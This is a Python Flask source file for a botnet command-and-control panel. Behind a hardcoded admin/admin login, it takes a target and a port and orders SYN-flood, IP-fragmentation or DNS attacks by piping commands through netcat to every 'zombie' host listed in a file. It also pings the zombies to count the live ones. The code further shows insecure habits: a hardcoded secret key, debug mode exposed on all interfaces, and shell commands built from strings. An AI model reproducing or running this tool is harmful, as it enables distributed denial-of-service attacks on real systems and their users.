import json
from flask import Flask, render_template, redirect, request, url_for, session
import ipaddress
from urllib.parse import urlparse
import socket
import subprocess

zombies = 0

app = Flask(__name__)
app.secret_key = "reallysupersecret"

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        if username == 'admin' and password == 'admin':
            session['username'] = username
            return redirect(url_for('dashboard'))
        else:
            error = "Incorrect Username or Password"
            return render_template('login.html', error=error)
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('dashboard.html',number=zombies)

@app.route('/start_attack', methods=['POST'])
def start_attack():
    global target_ip, attack_type, port
    target = request.form.get('target_ip')
    try:
        target_ip = ipaddress.ip_address(target)
    except:
        parsed_url = urlparse(target)
        hostname = parsed_url.hostname
        try:
            target_ip = socket.gethostbyname(hostname)
        except:
            return render_template('dashboard.html',error="Failed to resolve target :/",number=zombies)            

    attack_type = request.form.get('attack_type')
    port_str = request.form.get('port')

    try:
        port = int(port_str) if port_str else "None"
    except:
        return render_template('dashboard.html',error="Invalid port provided :/",number=zombies)
             
    if attack_type == 'syn' and port == "None":
        return render_template('dashboard.html',error="Port must be provided for SYN flood attacks.",number=zombies)
    
    return redirect(url_for('attack'))

@app.route('/check_status', methods=['POST'])
def check_status():
    global zombies
    zombies = 0
    print("Button was clicked")
    try:
        with open('zombies.txt', 'r') as f:
            for line in f:
                ip = line.strip()
                try:
                    # Ping the IP address with -c 1 (send 1 packet)
                    subprocess.run(['ping','-w','1', '-c', '1', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
                    print(f"{ip} is alive")
                    zombies += 1
                except subprocess.CalledProcessError:
                    print(f"{ip} is not reachable")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return render_template('dashboard.html', error="An unexpected error occurred", number=0)

    return render_template('dashboard.html', number=zombies)


@app.route('/attack', methods=['GET'])
def attack():
    if attack_type == 'syn':
        command = f" echo {target_ip} {port} syn | "
    if attack_type == 'ipfrag':
        command = f" echo {target_ip} {port} ipfrag | "
    if attack_type == 'dns':
        command = f" echo {target_ip} {port} dns | "

    with open('zombies.txt', 'r') as f:
       for line in f:
            ip = line.strip()
            command += f"nc -q 0 {ip} 12345"
            subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    return render_template('attack.html', command="Attacks succesfully Sent :)")


if __name__ == '__main__': 
    app.run(debug=True,host='0.0.0.0')
